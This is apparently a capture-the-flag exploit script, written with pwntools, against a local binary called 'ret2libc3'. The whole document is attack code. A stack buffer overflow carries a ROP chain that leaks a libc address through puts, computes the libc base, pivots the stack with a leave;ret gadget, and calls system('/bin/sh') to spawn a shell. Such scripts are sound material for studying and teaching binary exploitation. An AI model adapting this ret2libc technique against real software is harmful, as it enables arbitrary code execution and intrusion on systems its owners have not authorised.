from pwn import *

p = process("./ret2libc3")
gdb.attach(p,"b *0x0804854C")
elf = ELF("./ret2libc3")
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")

gets_got = elf.got["gets"]
gets_plt = elf.plt["gets"]
puts_plt = elf.plt["puts"]
# ROPgadget --binary ./ret2libc3 --only "pop|ret"
pop_ebp_ret = 0x080485db
# ROPgadget --binary ./ret2libc3 | grep leave
leave_ret = 0x08048448
rop_addr = 0x804a800

p.recvuntil("ret2libc3\n")
payload1 = "a" * 0x108 + "junk"
payload1 += p32(puts_plt) + p32(pop_ebp_ret) + p32(gets_got)
payload1 += p32(gets_plt) + p32(pop_ebp_ret) + p32(rop_addr)
payload1 += p32(pop_ebp_ret) + p32(rop_addr - 4)
payload1 += p32(leave_ret)
p.sendline(payload1)

leak_addr = u32(p.recv(4))
libc_base = leak_addr - libc.symbols["gets"]
libc.address = libc_base
log.success("libc_base:" + hex(libc.address))

system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
payload2 = p32(system) + "junk" + p32(binsh)
p.sendline(payload2)
p.interactive()
